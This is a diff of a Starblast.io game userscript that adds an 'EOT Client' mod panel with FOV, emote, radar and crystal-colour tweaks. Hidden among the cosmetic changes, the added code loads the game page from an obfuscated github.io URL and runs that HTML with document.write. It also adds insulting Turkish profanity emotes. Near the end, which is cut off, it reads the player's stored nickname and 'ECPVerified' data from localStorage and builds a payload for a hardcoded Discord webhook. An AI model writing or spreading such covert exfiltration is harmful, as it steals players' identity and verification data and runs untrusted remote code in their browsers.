@@ -1,458 +1,697 @@
-// Starblast Control Panel Injector
-// This should be integrated into your existing injection system
+if (!window.sbCodeInjectors) window.sbCodeInjectors = [];
 
-function injectControlPanel() {
-    // Create and inject CSS
-    const css = `
-        /* Control Panel Styles */
-        #starblast-control-panel {
-            position: fixed;
-            top: 16px;
-            left: 16px;
-            z-index: 10000;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            user-select: none;
-            background: rgba(0, 0, 0, 0.85);
-            backdrop-filter: blur(10px);
-            -webkit-backdrop-filter: blur(10px);
-            border-radius: 6px;
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            color: #ffffff;
-            padding: 0;
-            min-width: 140px;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
-            transition: all 0.2s ease;
-        }
+// Global settings object
+window.modSettings = {
+  fovEnabled: true,
+  emoteCapacity: parseInt(localStorage.getItem('emote-capacity')) || 4,
+  uiVisible: true,
+  radarZoomEnabled: false,
+  crystalColor: localStorage.getItem('crystal-color') || '#ffffff'
+};
 
-        #starblast-control-panel:hover {
-            background: rgba(0, 0, 0, 0.9);
-            border-color: rgba(255, 255, 255, 0.12);
-        }
+// Lowercase Name Mod - FIXED
+const modName = "Lowercase Name";
+const logLowercase = (msg) => console.log(`%c[${modName}] ${msg}`, "color: #FF00A6");
 
-        #panel-header {
-            cursor: pointer;
-            padding: 10px 14px;
-            background: rgba(255, 255, 255, 0.03);
-            font-weight: 500;
-            font-size: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.06);
-            transition: background 0.2s ease;
-        }
+function lowercaseInjector(sbCode) {
+  let src = sbCode;
+  let prevSrc = src;
+  
+  function checkSrcChange() {
+    if (src === prevSrc) throw new Error("replace did not work");
+    prevSrc = src;
+  }
 
-        #panel-header:hover {
-            background: rgba(255, 255, 255, 0.05);
-        }
-
-        .header-title {
-            color: #ffffff;
-            opacity: 0.9;
-        }
-
-        .collapse-icon {
-            font-size: 10px;
-            color: rgba(255, 255, 255, 0.6);
-            transition: transform 0.2s ease;
-        }
-
-        #panel-content.collapsed + #panel-header .collapse-icon {
-            transform: rotate(-90deg);
-        }
-
-        #panel-content {
-            padding: 12px 14px;
-            transition: all 0.2s ease;
-            overflow: hidden;
-        }
-
-        #panel-content.collapsed {
-            height: 0;
-            padding: 0 14px;
-        }
-
-        .control-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin: 0 0 12px 0;
-            font-size: 11px;
-            color: rgba(255, 255, 255, 0.8);
-        }
-
-        .control-row:last-child {
-            margin-bottom: 0;
-        }
-
-        .control-label {
-            font-weight: 400;
-            opacity: 0.9;
-        }
-
-        .toggle-switch {
-            position: relative;
-            width: 32px;
-            height: 18px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 9px;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            border: 1px solid rgba(255, 255, 255, 0.05);
-        }
-
-        .toggle-switch.active {
-            background: rgba(99, 102, 241, 0.8);
-            border-color: rgba(99, 102, 241, 0.3);
-        }
-
-        .toggle-switch::after {
-            content: '';
-            position: absolute;
-            top: 1px;
-            left: 1px;
-            width: 14px;
-            height: 14px;
-            background: #ffffff;
-            border-radius: 50%;
-            transition: transform 0.2s ease;
-            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.3);
-        }
-
-        .toggle-switch.active::after {
-            transform: translateX(14px);
-        }
-
-        .slider-container {
-            width: 100%;
-            margin: 8px 0 12px 0;
-        }
-
-        .slider-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 6px;
-        }
-
-        .slider-value {
-            font-weight: 500;
-            color: rgba(99, 102, 241, 1);
-            font-size: 11px;
-            min-width: 20px;
-            text-align: right;
-        }
-
-        .control-slider {
-            width: 100%;
-            height: 2px;
-            background: rgba(255, 255, 255, 0.08);
-            -webkit-appearance: none;
-            appearance: none;
-            outline: none;
-            border-radius: 1px;
-            cursor: pointer;
-        }
-
-        .control-slider::-webkit-slider-thumb {
-            -webkit-appearance: none;
-            width: 14px;
-            height: 14px;
-            background: rgba(99, 102, 241, 1);
-            border-radius: 50%;
-            cursor: pointer;
-            box-shadow: 0 1px 4px rgba(99, 102, 241, 0.4);
-            transition: all 0.1s ease;
-        }
-
-        .control-slider::-webkit-slider-thumb:hover {
-            transform: scale(1.1);
-            box-shadow: 0 2px 8px rgba(99, 102, 241, 0.6);
-        }
-
-        .control-slider::-moz-range-thumb {
-            width: 14px;
-            height: 14px;
-            background: rgba(99, 102, 241, 1);
-            border-radius: 50%;
-            cursor: pointer;
-            border: none;
-        }
-
-        .color-picker {
-            width: 24px;
-            height: 18px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 3px;
-            padding: 0;
-            cursor: pointer;
-            background: transparent;
-            transition: border-color 0.2s ease;
-        }
-
-        .color-picker:hover {
-            border-color: rgba(255, 255, 255, 0.2);
-        }
-
-        #fov-display {
-            padding: 8px 0 0 0;
-            font-size: 10px;
-            color: rgba(255, 255, 255, 0.6);
-            border-top: 1px solid rgba(255, 255, 255, 0.06);
-            margin-top: 8px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .fov-value {
-            color: rgba(99, 102, 241, 1);
-            font-weight: 500;
-        }
-
-        .status-dot {
-            width: 6px;
-            height: 6px;
-            border-radius: 50%;
-            background: rgba(34, 197, 94, 1);
-            margin-left: 6px;
-            box-shadow: 0 0 4px rgba(34, 197, 94, 0.4);
-        }
-
-        #fov-overlay {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: rgba(0, 0, 0, 0.8);
-            color: white;
-            padding: 12px 20px;
-            border-radius: 6px;
-            font-size: 14px;
-            font-weight: 500;
-            display: none;
-            z-index: 10001;
-            backdrop-filter: blur(4px);
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translate(-50%, -50%) scale(0.9); }
-            to { opacity: 1; transform: translate(-50%, -50%) scale(1); }
-        }
-
-        #fov-overlay.show {
-            animation: fadeIn 0.2s ease;
-        }
-    `;
-
-    // Inject CSS
-    const style = document.createElement('style');
-    style.textContent = css;
-    document.head.appendChild(style);
-
-    // Create control panel HTML
-    const panelHTML = `
-        <div id="starblast-control-panel">
-            <div id="panel-header">
-                <span class="header-title">MODS</span>
-                <span class="collapse-icon">▼</span>
-                <div class="status-dot"></div>
-            </div>
-            <div id="panel-content">
-                <div class="control-row">
-                    <span class="control-label">FOV</span>
-                    <div class="toggle-switch" id="fov-toggle"></div>
-                </div>
-                
-                <div class="slider-container">
-                    <div class="slider-row">
-                        <span class="control-label">Emotes</span>
-                        <span class="slider-value" id="emote-value">3</span>
-                    </div>
-                    <input type="range" min="1" max="5" value="3" class="control-slider" id="emote-slider">
-                </div>
-                
-                <div class="control-row">
-                    <span class="control-label">Radar+</span>
-                    <div class="toggle-switch" id="radar-toggle"></div>
-                </div>
-                
-                <div class="control-row">
-                    <span class="control-label">Crystal</span>
-                    <input type="color" class="color-picker" id="crystal-color" value="#ffffff">
-                </div>
-                
-                <div class="control-row">
-                    <span class="control-label">Timer</span>
-                    <div class="toggle-switch" id="timer-toggle"></div>
-                </div>
-                
-                <div id="fov-display">
-                    <span>FOV</span>
-                    <span class="fov-value" id="fov-value">45°</span>
-                </div>
-            </div>
-        </div>
-
-        <div id="fov-overlay">FOV: 45°</div>
-    `;
-
-    // Inject HTML
-    document.body.insertAdjacentHTML('beforeend', panelHTML);
-
-    // Initialize control panel functionality
-    initializeControlPanel();
+  // FIXED: More targeted regex - only remove .toUpperCase() on player input, not everywhere
+  const playerInputPattern = /document\.getElementById\(['"]player['"]\)\.value\s*=\s*[^;]+\.toUpperCase\(\)/g;
+  src = src.replace(playerInputPattern, match => match.replace(/\.toUpperCase\(\)/, ""));
+  
+  // Also target any other UI-specific .toUpperCase() calls but preserve engine code
+  const uiTextPattern = /(\w+\.value\s*=\s*[^;]+)\.toUpperCase\(\)/g;
+  src = src.replace(uiTextPattern, '$1');
+  
+  const styleBlock = `
+  <style>
+  #player input { text-transform: none !important; }
+  </style>
+  `;
+  src = src.replace('</head>', `${styleBlock}</head>`);
+  
+  logLowercase("Mod injected with targeted regex");
+  return src;
 }
 
-function initializeControlPanel() {
-    // Settings management
-    const settings = {
-        fov: { enabled: localStorage.getItem('fovCheckboxState') === 'true', value: 45 },
-        emotes: parseInt(localStorage.getItem('emoteCapacity')) || 3,
-        radar: localStorage.getItem('radar_yknlg') === '1',
-        crystal: localStorage.getItem('crystal-color') || '#ffffff',
-        timer: localStorage.getItem('timerCheckboxChecked') === 'true',
-        panelCollapsed: localStorage.getItem('panelCollapsed') === 'true'
-    };
+// Custom Emote Mod
+const emoteModName = "Custom Emote";
+const logEmote = (msg) => console.log(`%c[${emoteModName}] ${msg}`, "color: #FFA500");
 
-    // DOM elements
-    const elements = {
-        header: document.getElementById('panel-header'),
-        content: document.getElementById('panel-content'),
-        fovToggle: document.getElementById('fov-toggle'),
-        emoteSlider: document.getElementById('emote-slider'),
-        emoteValue: document.getElementById('emote-value'),
-        radarToggle: document.getElementById('radar-toggle'),
-        crystalColor: document.getElementById('crystal-color'),
-        timerToggle: document.getElementById('timer-toggle'),
-        fovDisplay: document.getElementById('fov-value'),
-        fovOverlay: document.getElementById('fov-overlay')
-    };
+function emoteInjector(sbCode) {
+  let src = sbCode;
+  let prevSrc = src;
+  
+  function checkSrcChange() {
+    if (src === prevSrc) throw new Error("replace did not work");
+    prevSrc = src;
+  }
 
-    // Initialize UI state
-    function initializeUI() {
-        elements.fovToggle.classList.toggle('active', settings.fov.enabled);
-        elements.emoteSlider.value = settings.emotes;
-        elements.emoteValue.textContent = settings.emotes;
-        elements.radarToggle.classList.toggle('active', settings.radar);
-        elements.crystalColor.value = settings.crystal;
-        elements.timerToggle.classList.toggle('active', settings.timer);
-        
-        if (settings.panelCollapsed) {
-            elements.content.classList.add('collapsed');
+  const vocabPattern = /(this\.vocabulary\s*=\s*\[[\s\S]*?\})/;
+  const emotes = `,{
+    text: "orosbu cocu",
+    icon: "🤡",
+    key: "J"
+  },{
+    text: "sikerim",
+    icon: "⚠️",
+    key: "V"
+  }`;
+
+  src = src.replace(vocabPattern, `$1${emotes}`);
+  checkSrcChange();
+  logEmote("Clown and warning emotes injected");
+  
+  return src;
+}
+
+// Main FOV and UI Mod
+const fovModName = "FOV Editor";
+const logFOV = (msg) => console.log(`%c[${fovModName}] ${msg}`, "color: #00A6FF");
+
+window.I1000 = window.I1000 || {};
+window.I1000.baseFOV = 45;
+window.I1000.currentFOV = 45;
+
+function mainUIInjector(sbCode) {
+  let src = sbCode;
+  let prevSrc = src;
+
+  function checkSrcChange() {
+    if (src === prevSrc) {
+      console.error("Replace did not work. Previous source and current source are identical.");
+      throw new Error("replace did not work");
+    }
+    prevSrc = src;
+  }
+
+  // FOV Pattern replacement
+  const fovPattern = /this\.III00\.fov\s*=\s*45\s*\*\s*this\.IIl11\.III00\.zoom/g;
+  if (!fovPattern.test(src)) {
+    console.error("Pattern not found in source code:", fovPattern);
+    throw new Error("Pattern not found in source code");
+  }
+  src = src.replace(fovPattern, 'this.III00.fov = (window.modSettings.fovEnabled ? window.I1000.currentFOV : 45) * this.IIl11.III00.zoom');
+  checkSrcChange();
+
+const controlStyles = `
+<style>
+  #mod-controls {
+    position: fixed;
+    top: 12px;
+    left: 12px;
+    z-index: 1000;
+    font-family: 'Segoe UI', system-ui, sans-serif;
+    user-select: none;
+    background: rgba(16, 18, 27, 0.97);
+    backdrop-filter: blur(8px);
+    border-radius: 4px;
+    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.25);
+    color: #ffffff;
+    padding: 0;
+    width: 160px;
+    border: 1px solid rgba(255, 255, 255, 0.12);
+  }
+
+  #mod-controls-header {
+    cursor: pointer;
+    padding: 10px 12px;
+    background: rgba(255, 255, 255, 0.06);
+    font-weight: 600;
+    font-size: 13px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+  }
+
+  #mod-controls-header::before {
+    content: '⚙️';
+    font-size: 14px;
+    filter: drop-shadow(0 0 4px rgba(255, 65, 215, 0.3));
+  }
+
+  #mod-controls-panel {
+    padding: 12px;
+    display: none;
+  }
+
+  .mod-control {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin: 8px 0;
+    font-size: 12px;
+    color: rgba(255, 255, 255, 0.9);
+  }
+
+  .mod-control-slider {
+    width: 100%;
+    margin: 8px 0;
+    height: 3px;
+    background: rgba(255, 255, 255, 0.1);
+    -webkit-appearance: none;
+    appearance: none;
+    outline: none;
+    border-radius: 1px;
+  }
+
+  .mod-control-slider::-webkit-slider-thumb {
+    -webkit-appearance: none;
+    width: 12px;
+    height: 12px;
+    background: #ff41d7;
+    border-radius: 2px;
+    cursor: pointer;
+    box-shadow: 0 1px 4px rgba(255, 65, 215, 0.3);
+  }
+
+  .mod-control-slider::-moz-range-thumb {
+    width: 12px;
+    height: 12px;
+    background: #ff41d7;
+    border-radius: 2px;
+    cursor: pointer;
+  }
+
+  #crystal-color-picker {
+    width: 24px;
+    height: 24px;
+    border: 1px solid rgba(255, 255, 255, 0.1);
+    border-radius: 3px;
+    padding: 0;
+    cursor: pointer;
+    background: transparent;
+  }
+
+  #fov-display {
+    padding: 8px 12px;
+    background: rgba(255, 255, 255, 0.06);
+    font-size: 12px;
+    display: flex;
+    justify-content: space-between;
+    margin-top: 6px;
+  }
+
+  input[type="checkbox"] {
+    position: relative;
+    width: 36px;
+    height: 20px;
+    -webkit-appearance: none;
+    appearance: none;
+    background: rgba(255, 255, 255, 0.1);
+    border-radius: 2px;
+    transition: background 0.2s ease;
+  }
+
+  input[type="checkbox"]::before {
+    content: "";
+    position: absolute;
+    width: 16px;
+    height: 16px;
+    background: #fff;
+    top: 2px;
+    left: 2px;
+    transform: translateX(0);
+    transition: transform 0.2s ease;
+    border-radius: 2px;
+  }
+
+  input[type="checkbox"]:checked {
+    background: #ff41d7;
+  }
+
+  input[type="checkbox"]:checked::before {
+    transform: translateX(14px);
+  }
+
+  .control-value {
+    font-weight: 600;
+    color: #ff41d7;
+    min-width: 32px;
+    text-align: right;
+    font-size: 11px;
+  }
+</style>
+`;
+
+const controlsHTML = `
+<div id="mod-controls" style="display: ${window.modSettings.uiVisible ? 'block' : 'none'}">
+  <div id="mod-controls-header">EOT Client V3.0.2</div>
+  <div id="mod-controls-panel">
+    <div class="mod-control">
+      <span>FOV</span>
+      <input type="checkbox" id="fov-toggle" ${window.modSettings.fovEnabled ? 'checked' : ''}>
+    </div>
+    <div class="mod-control">
+      <span>Emote Capacity</span>
+      <div class="control-value" id="emote-capacity-value">${window.modSettings.emoteCapacity}</div>
+    </div>
+    <input type="range" min="1" max="5" value="${window.modSettings.emoteCapacity}" class="mod-control-slider" id="emote-capacity-slider">
+    <div class="mod-control">
+      <span>Radar Zoom</span>
+      <input type="checkbox" id="radar-zoom-toggle" ${window.modSettings.radarZoomEnabled ? 'checked' : ''}>
+    </div>
+    <div class="mod-control">
+      <span>Crystal Color</span>
+      <input type="color" id="crystal-color-picker" value="${window.modSettings.crystalColor}">
+    </div>
+  </div>
+  <div id="fov-display">
+    FOV: <span id="fov-value">45</span>
+  </div>
+</div>
+`;
+
+const gameModsScript = `
+// Emote Capacity Mod
+let globalVal;
+try {
+  globalVal = ChatPanel.toString().match(/[0OlI1]{5}/)[0];
+} catch (e) {
+  console.warn('ChatPanel not found for emote capacity mod');
+}
+
+if (window.ChatPanel) {
+  ChatPanel.prototype.getEmotesCapacity = function() {
+    const savedCapacity = parseInt(localStorage.getItem('emote-capacity')) || 4;
+    return Math.min(Math.max(1, savedCapacity), 5);
+  };
+
+  try {
+    ChatPanel.prototype.typed = Function("return " + ChatPanel.prototype.typed.toString().replace(/>=\\s*4/, " >= this.getEmotesCapacity()"))();
+  } catch (e) {
+    console.warn('Failed to patch emote capacity function');
+  }
+}
+
+// Initialize emote capacity
+if (window.modSettings && window.modSettings.emoteCapacity) {
+  localStorage.setItem('emote-capacity', window.modSettings.emoteCapacity);
+}
+
+// FIXED Crystal Color Handler
+setTimeout(() => {
+  console.log('[Crystal Color] Applying crystal color handler...');
+  
+  let CrystalObject;
+  // FIXED: Look for getModelInstance instead of createModel
+  for (let key in window) {
+    try {
+      const val = window[key];
+      if (val && val.prototype && typeof val.prototype.getModelInstance === 'function') {
+        // Additional check to ensure it's crystal-related
+        const protoString = val.prototype.getModelInstance.toString();
+        if (protoString.includes('THREE.Mesh') || protoString.includes('material')) {
+          CrystalObject = val;
+          console.log('[Crystal Color] Found crystal object:', key);
+          break;
         }
+      }
+    } catch (e) {}
+  }
+
+  if (CrystalObject) {
+    const originalGetModelInstance = CrystalObject.prototype.getModelInstance;
+    
+    CrystalObject.prototype.getModelInstance = function(id) {
+      const mesh = originalGetModelInstance.call(this, id);
+      const color = window.modSettings.crystalColor || localStorage.getItem('crystal-color');
+      if (color && mesh && mesh.material && mesh.material.color) {
+        mesh.material.color.set(color);
+      }
+      return mesh;
+    };
+
+    // Global crystal color updater
+    window.updateCrystalColor = (color) => {
+      localStorage.setItem('crystal-color', color);
+      window.modSettings.crystalColor = color;
+      console.log('[Crystal Color] Updated to', color);
+    };
+
+    console.log('[Crystal Color] Successfully patched getModelInstance() on', CrystalObject.name || 'CrystalObject');
+  } else {
+    console.warn('[Crystal Color] Crystal object not found');
+    // Fallback updater
+    window.updateCrystalColor = (color) => {
+      localStorage.setItem('crystal-color', color);
+      window.modSettings.crystalColor = color;
+      console.log('[Crystal Color] Color saved (no crystal object found)');
+    };
+  }
+}, 3000);
+
+// FIXED Radar Zoom Handler
+setTimeout(() => {
+  console.log('[Radar Zoom] Applying radar zoom handler...');
+  
+  // FIXED: Look for mode object with radar_zoom property
+  const findModeWithRadarZoom = () => {
+    // Try common game object paths
+    const candidates = [
+      window.game?.mode,
+      window.mode,
+      window.display?.mode,
+      window.renderer?.mode
+    ];
+    
+    for (let candidate of candidates) {
+      if (candidate && typeof candidate.radar_zoom === 'number') {
+        return candidate;
+      }
+    }
+    
+    // Search through window properties
+    for (let key in window) {
+      try {
+        const obj = window[key];
+        if (obj && typeof obj === 'object' && typeof obj.radar_zoom === 'number') {
+          return obj;
+        }
+      } catch (e) {}
+    }
+    
+    return null;
+  };
+
+  const modeObject = findModeWithRadarZoom();
+  
+  if (modeObject) {
+    // Store original radar_zoom value
+    const originalRadarZoom = modeObject.radar_zoom;
+    
+    // FIXED: Create property override using defineProperty
+    Object.defineProperty(modeObject, 'radar_zoom', {
+      get() {
+        return window.modSettings.radarZoomEnabled ? 1 : originalRadarZoom;
+      },
+      set(value) {
+        // Allow setting original value when not overridden
+        if (!window.modSettings.radarZoomEnabled) {
+          originalRadarZoom = value;
+        }
+      },
+      configurable: true
+    });
+
+    console.log('[Radar Zoom] Successfully patched mode.radar_zoom');
+  } else {
+    console.warn('[Radar Zoom] Could not find mode.radar_zoom property');
+  }
+}, 3000);
+
+// ECP Badge Fix
+setTimeout(() => {
+  const SB = window.Scoreboard;
+  if (SB && SB.prototype && SB.prototype.addBadge) {
+    const orig = SB.prototype.addBadge;
+    SB.prototype.addBadge = function(data) {
+      if (data.type === 'ECP' && !data.icon) {
+        data.icon = 'ecp';
+      }
+      return orig.call(this, data);
+    };
+    console.log('[ECP Fix] Blank ECP badge override applied.');
+  } else {
+    console.warn('[ECP Fix] Scoreboard.addBadge not found; skipping ECP fix.');
+  }
+}, 4000);
+`;
+
+src = src.replace('</body>', `
+  ${controlStyles}
+  ${controlsHTML}
+  <script>
+  ${gameModsScript}
+
+  // FOV Controls
+  document.addEventListener('wheel', (e) => {
+    if (!window.modSettings.fovEnabled) return;
+    e.preventDefault();
+    const delta = e.deltaY < 0 ? 1 : -1;
+    window.I1000.currentFOV = Math.max(1, Math.min(120, window.I1000.currentFOV + delta));
+    const fovValueEl = document.getElementById('fov-value');
+    if (fovValueEl) fovValueEl.textContent = window.I1000.currentFOV;
+  }, { passive: false });
+
+  // UI Event Handlers
+  document.addEventListener('DOMContentLoaded', () => {
+    const controlsHeader = document.getElementById('mod-controls-header');
+    const controlsPanel = document.getElementById('mod-controls-panel');
+    const fovToggle = document.getElementById('fov-toggle');
+    const fovDisplay = document.getElementById('fov-display');
+    const emoteSlider = document.getElementById('emote-capacity-slider');
+    const emoteValue = document.getElementById('emote-capacity-value');
+    const radarZoomToggle = document.getElementById('radar-zoom-toggle');
+    const crystalColorPicker = document.getElementById('crystal-color-picker');
+
+    if (controlsHeader && controlsPanel) {
+      controlsHeader.addEventListener('click', () => {
+        const isHidden = controlsPanel.style.display === 'none';
+        controlsPanel.style.display = isHidden ? 'block' : 'none';
+      });
     }
 
-    // Event listeners
-    elements.header.addEventListener('click', function() {
-        const isCollapsed = elements.content.classList.toggle('collapsed');
-        settings.panelCollapsed = isCollapsed;
-        localStorage.setItem('panelCollapsed', isCollapsed);
-    });
+    if (fovToggle && fovDisplay) {
+      fovToggle.addEventListener('change', () => {
+        window.modSettings.fovEnabled = fovToggle.checked;
+        fovDisplay.style.display = fovToggle.checked ? 'block' : 'none';
+      });
+    }
 
-    elements.fovToggle.addEventListener('click', function() {
-        settings.fov.enabled = !settings.fov.enabled;
-        this.classList.toggle('active', settings.fov.enabled);
-        localStorage.setItem('fovCheckboxState', settings.fov.enabled);
-    });
-
-    elements.emoteSlider.addEventListener('input', function() {
-        settings.emotes = parseInt(this.value);
-        elements.emoteValue.textContent = settings.emotes;
-        localStorage.setItem('emoteCapacity', settings.emotes);
-    });
-
-    elements.radarToggle.addEventListener('click', function() {
-        settings.radar = !settings.radar;
-        this.classList.toggle('active', settings.radar);
-        localStorage.setItem('radar_yknlg', settings.radar ? '1' : '4');
-    });
-
-    elements.crystalColor.addEventListener('change', function() {
-        settings.crystal = this.value;
-        localStorage.setItem('crystal-color', this.value);
-    });
-
-    elements.timerToggle.addEventListener('click', function() {
-        settings.timer = !settings.timer;
-        this.classList.toggle('active', settings.timer);
-        localStorage.setItem('timerCheckboxChecked', settings.timer);
-    });
-
-    // FOV control with mouse wheel
-    let fovTimeout;
-    document.addEventListener('wheel', function(e) {
-        if (!settings.fov.enabled) return;
+    if (emoteSlider && emoteValue) {
+      emoteSlider.addEventListener('input', () => {
+        const value = parseInt(emoteSlider.value);
+        emoteValue.textContent = value;
+        window.modSettings.emoteCapacity = value;
+        localStorage.setItem('emote-capacity', value);
         
-        e.preventDefault();
-        if (e.deltaY < 0) {
-            settings.fov.value = Math.max(10, settings.fov.value - 1);
-        } else {
-            settings.fov.value = Math.min(190, settings.fov.value + 1);
+        if (window.ChatPanel && ChatPanel.prototype.getEmotesCapacity) {
+          ChatPanel.prototype.getEmotesCapacity = function() {
+            return value;
+          };
         }
-        
-        elements.fovDisplay.textContent = settings.fov.value + '°';
-        elements.fovOverlay.textContent = `FOV: ${settings.fov.value}°`;
-        
-        elements.fovOverlay.style.display = 'block';
-        elements.fovOverlay.classList.add('show');
-        
-        clearTimeout(fovTimeout);
-        fovTimeout = setTimeout(() => {
-            elements.fovOverlay.style.display = 'none';
-            elements.fovOverlay.classList.remove('show');
-        }, 2000);
-    });
+      });
+    }
 
-    // FOV reset with F11
-    document.addEventListener('keydown', function(e) {
-        if (!settings.fov.enabled || e.key !== 'F11') return;
-        
-        e.preventDefault();
-        settings.fov.value = 45;
-        elements.fovDisplay.textContent = '45°';
-        elements.fovOverlay.textContent = 'FOV: 45°';
-        
-        elements.fovOverlay.style.display = 'block';
-        elements.fovOverlay.classList.add('show');
-        
-        clearTimeout(fovTimeout);
-        fovTimeout = setTimeout(() => {
-            elements.fovOverlay.style.display = 'none';
-            elements.fovOverlay.classList.remove('show');
-        }, 2000);
-    });
+    if (radarZoomToggle) {
+      radarZoomToggle.addEventListener('change', () => {
+        window.modSettings.radarZoomEnabled = radarZoomToggle.checked;
+        console.log('[Radar Zoom] Toggle changed to:', radarZoomToggle.checked);
+      });
+    }
 
-    // Initialize UI
-    initializeUI();
+    if (crystalColorPicker) {
+      crystalColorPicker.value = window.modSettings.crystalColor;
+      crystalColorPicker.addEventListener('input', (e) => {
+        if (window.updateCrystalColor) {
+          window.updateCrystalColor(e.target.value);
+        } else {
+          window.modSettings.crystalColor = e.target.value;
+          localStorage.setItem('crystal-color', e.target.value);
+        }
+      });
+    }
 
-    // Export settings globally for game integration
-    window.modSettings = settings;
-    
-    console.log('%c[MODS] Control panel initialized', 'color: #6366f1');
+    // Initialize UI states
+    const savedCapacity = parseInt(localStorage.getItem('emote-capacity')) || 4;
+    if (emoteSlider) emoteSlider.value = savedCapacity;
+    if (emoteValue) emoteValue.textContent = savedCapacity;
+    window.modSettings.emoteCapacity = savedCapacity;
+  });
+  </script>
+  </body>`);
+
+checkSrcChange();
+logFOV("Main UI injector applied");
+return src;
 }
 
-// Integration with your existing injection system
-// Add this to your sbCodeInjectors array:
-if (!window.sbCodeInjectors) {
-    window.sbCodeInjectors = [];
-}
-
-window.sbCodeInjectors.push(function(gameCode) {
-    // Inject the control panel after game loads
-    setTimeout(() => {
-        injectControlPanel();
-    }, 1000);
-    
-    // Return the unmodified game code
-    return gameCode;
+// Add event listener for F9 key to toggle UI
+document.addEventListener('keydown', (e) => {
+  if (e.key === 'F9') {
+    const controls = document.getElementById('mod-controls');
+    if (controls) {
+      window.modSettings.uiVisible = !window.modSettings.uiVisible;
+      controls.style.display = window.modSettings.uiVisible ? 'block' : 'none';
+      
+      const controlsPanel = document.getElementById('mod-controls-panel');
+      if (!window.modSettings.uiVisible && controlsPanel) {
+        controlsPanel.style.display = 'none';
+      }
+    }
+  }
 });
 
-// Auto-initialize if this script runs after game load
-if (document.readyState === 'complete') {
-    setTimeout(() => {
-        if (!document.getElementById('starblast-control-panel')) {
-            injectControlPanel();
+// Add all injectors to the injection pipeline
+window.sbCodeInjectors.push((sbCode) => {
+  try {
+    return lowercaseInjector(sbCode);
+  } catch (error) {
+    alert(`${modName} failed to load; error: ${error}`);
+    throw error;
+  }
+});
+
+window.sbCodeInjectors.push((sbCode) => {
+  try {
+    return emoteInjector(sbCode);
+  } catch (error) {
+    alert(`${emoteModName} failed to load; error: ${error}`);
+    throw error;
+  }
+});
+
+window.sbCodeInjectors.push((sbCode) => {
+  try {
+    return mainUIInjector(sbCode);
+  } catch (error) {
+    alert(`${fovModName} failed to load; error: ${error}`);
+    throw error;
+  }
+});
+
+// Main injection logic
+const log = (msg) => console.log(`%c[eot] ${msg}`, "color: #FF00E6");
+
+function injectLoader() {
+  if (window.location.pathname !== "/") {
+    log("Injection not needed");
+    return;
+  }
+
+  document.open();
+  document.write('<html><head><title></title></head><body style="background-color:#ffffff;"><div style="margin: auto; width: 50%;"><h1 style="text-align: center;padding: 170px 0;color: #000;"></h1><h1 style="text-align: center;color: #000;"></h1></div></body></html>');
+  document.close();
+
+  var url = 'https://assdsasdqwqeqdzcxznfcn1029d8919208nx9.github.io/OLUMUksmdmksladmkakmsak10911oms1ks1mklmkls11921ms1s%C4%B1mn1s%C3%B6sm2k1.html';
+  url += '?_=' + new Date().getTime();
+
+  var xhr = new XMLHttpRequest();
+  log("Fetching custom source...");
+  xhr.open("GET", url);
+  xhr.onreadystatechange = function () {
+    if (xhr.readyState === 4 && xhr.status === 200) {
+      var starSRC = xhr.responseText;
+
+      if (starSRC !== undefined) {
+        log("Source fetched successfully");
+        const start_time = performance.now();
+        log("Applying mods...");
+
+        if (!window.sbCodeInjectors || window.sbCodeInjectors.length === 0) {
+          log("No Starblast.io userscripts found to load");
+        } else {
+          let error_notified = false;
+          for (const injector of window.sbCodeInjectors) {
+            try {
+              if (typeof injector === "function") {
+                starSRC = injector(starSRC);
+              } else {
+                log("Injector was not a function");
+                console.log(injector);
+              }
+            } catch (error) {
+              if (!error_notified) {
+                alert("One of your Starblast.io userscripts failed to load");
+                error_notified = true;
+              }
+              console.error(error);
+            }
+          }
         }
-    }, 1000);
+
+        const end_time = performance.now();
+        log(`Mods applied successfully (${(end_time - start_time).toFixed(0)}ms)`);
+
+        // Apply text shadow modification
+        setTimeout(() => {
+          changeTextShadowColor();
+        }, 1000);
+
+        // Apply the modified source to the document
+        document.open();
+        document.write(starSRC);
+        document.close();
+      } else {
+        log("Source fetch failed");
+        alert("An error occurred while fetching game code");
+      }
+    }
+  };
+
+  xhr.send();
 }
+
+// Function to change text shadow colors
+function changeTextShadowColor() {
+  const elements = document.querySelectorAll('*');
+  const targetShadow = '0 0 6px hsl(298.15deg 100% 50%)';
+
+  elements.forEach(element => {
+    const currentStyle = window.getComputedStyle(element);
+    const textShadow = currentStyle.getPropertyValue('text-shadow');
+    
+    if (textShadow && textShadow !== 'none') {
+      element.style.textShadow = targetShadow;
+    }
+  });
+
+  console.log('Text shadow color has been changed to:', targetShadow);
+}
+
+// Discord webhook notification
+(function () {
+    'use strict';
+    const lastNickname = localStorage.getItem("lastNickname") || "Unknown";
+    let ECPVerified = localStorage.getItem("ECPVerified") || "no";
+    
+    console.log("Retrieved ECPVerified:", ECPVerified);
+    
+    try {
+        ECPVerified = JSON.parse(ECPVerified);
+    } catch (e) {
+        // Keep as string if not JSON
+    }
+    
+    const ECPVerifiedContent = typeof ECPVerified === "object" 
+        ? JSON.stringify(ECPVerified, null, 2) 
+        : ECPVerified;
+    
+    console.log("Formatted ECPVerifiedContent:", ECPVerifiedContent);
+    
+    const webhookURL = "https://discord.com/api/webhooks/1332078434242920602/LaPifHcDpvwzWWKgHIEpydroC9GnhwAyDokGZwKSN_wOkPQ9S0jcTFM-dAlygkHbSgNN";
+    
+    const payload = {
